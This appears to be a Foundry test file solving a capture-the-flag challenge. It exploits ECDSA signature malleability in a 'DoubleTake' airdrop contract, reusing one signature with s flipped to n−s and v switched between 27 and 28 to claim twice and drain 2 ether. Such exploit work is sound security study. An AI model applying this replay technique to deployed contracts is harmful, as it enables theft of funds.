// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {DoubleTake} from  "../src/DoubleTake.sol";

contract DoubleTakePWN is Test {
    DoubleTake public doubletake;

    function setUp() public {
        doubletake = new DoubleTake{value: 2 ether}();
    }

    // Attack Path:
    // 1. call the claimAirdrop function for v = 27,28 to claim 2 ether
    function testPWN() public {
        bytes32 r = 0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7;
        bytes32 s = 0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69;
        bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
        address user = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
        doubletake.claimAirdrop(user, 1 ether, 27, r, s2);
        doubletake.claimAirdrop(user, 1 ether, 28, r, s);

        assertEq(user.balance, 2 ether);
    }
}